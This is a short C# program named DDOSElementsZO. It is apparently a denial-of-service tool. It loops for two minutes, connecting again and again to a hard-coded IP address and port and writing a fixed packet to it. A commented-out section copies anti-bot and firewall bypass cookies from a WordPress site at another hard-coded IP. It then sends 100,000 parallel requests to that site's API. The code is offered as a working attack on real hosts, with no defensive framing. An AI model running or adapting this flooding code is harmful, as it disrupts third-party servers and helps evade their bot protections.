using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DDOSElementsZO
{
    class Program
    {
        private static byte[] Data { get; set; }
        static void Main(string[] args)
        {
            Data = new byte[] { 8, 0, 35, 4, 183, 97, 0, 0 };
            var current = 4;
            var time = DateTime.Now.AddMinutes(2);
            SimpleTcpClient Client = new SimpleTcpClient();
            while (DateTime.Now.Ticks < time.Ticks && current > 0)
            {
                try
                {

                    if (Client.TcpClient == null)
                    {
                        Client.DataReceived += Client_DataReceived;
                        Client.Connect("51.79.145.33", 37955);

                    }
                    if (!Client.TcpClient.Connected)
                    {
                        Client.Connect("51.79.145.33", 37955);
                    }
                    Client.Write(Data);
                    Console.WriteLine("[SUCCESS]");
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    Console.WriteLine($"[FAILED]");
                    --current;
                }
            }

            //var baseAddress = new Uri("http://52.187.3.237");
            //var cookieContainer = new CookieContainer();
            //cookieContainer.Add(baseAddress, new Cookie("apbct_antibot", "cc9daec9f1db4b98bb0be04f7412f362"));
            //cookieContainer.Add(baseAddress, new Cookie("ct_sfw_pass_key", "d25dcf96e31ae5630d4ac527aa5110f7"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_prev_referer", "http%3A%2F%2F52.187.3.237%2Fwp-login.php%3Fredirect_to%3Dhttp%253A%252F%252F52.187.3.237%252Fwp-admin%252F%26reauth%3D1"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_site_landing_ts", "1595920867"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_visible_fields_count", "0"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_cookies_test", "%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_prev_referer%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522b0dc7476d82c8d4ac290835454a3a731%2522%257D"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_page_hits", "2"));
            //cookieContainer.Add(baseAddress, new Cookie("ct_fkp_timestamp", "0"));
            //cookieContainer.Add(baseAddress, new Cookie("wordpress_test_cookie", "WP%20Cookie%20check"));
            //cookieContainer.Add(baseAddress, new Cookie("paddos_vp8L7", "1"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_visible_fields", "0"));
            //cookieContainer.Add(baseAddress, new Cookie("apbct_timestamp", "1595920871"));
            //cookieContainer.Add(baseAddress, new Cookie("ct_ps_timestamp", "1595920903"));
            //cookieContainer.Add(baseAddress, new Cookie("ct_timezone", "7"));
            //cookieContainer.Add(baseAddress, new Cookie("ct_pointer_data", "%5B%5B534%2C1063%2C1065%5D%2C%5B522%2C1098%2C1209%5D%2C%5B490%2C1492%2C1353%5D%2C%5B484%2C1830%2C1505%5D%2C%5B436%2C1899%2C26988%5D%2C%5B418%2C1818%2C27002%5D%2C%5B314%2C1486%2C27154%5D%2C%5B293%2C1734%2C27306%5D%5D"));
            ////var c = new Cookie("apbct_antibot", "cc9daec9f1db4b98bb0be04f7412f362","/",);
            ////cookieContainer.Add(c);
            ////cookieContainer.Add(new Cookie("ct_sfw_pass_key", "d25dcf96e31ae5630d4ac527aa5110f7"));
            //var handler = new HttpClientHandler() { CookieContainer = cookieContainer };
            //var http = new HttpClient(handler) { BaseAddress = baseAddress };
            //var dic = new Dictionary<string, string>
            //{
            //    ["log"] = "asd",
            //    ["pwd"] = "asd",
            //    ["wp-submit"] = "Đăng nhập",
            //    ["redirect_to"] = "http://52.187.3.237/wp-admin/",
            //    ["testcookie"] = "1",
            //};
            //Parallel.For(0, 100000, i =>
            //{
            //    Stopwatch watch = new Stopwatch();
            //    watch.Start();
            //    var t = http.GetAsync("/wp-json/wp/v2/posts");
            //    t.Wait();
            //    Console.Write("SUCCESS");
            //});

            //Console.ReadLine();
        }
        private static void Client_DataReceived(object sender, Message e)
        {
            Data = e.Data;
            Console.WriteLine("[RECIEVED]");
        }
    }
}
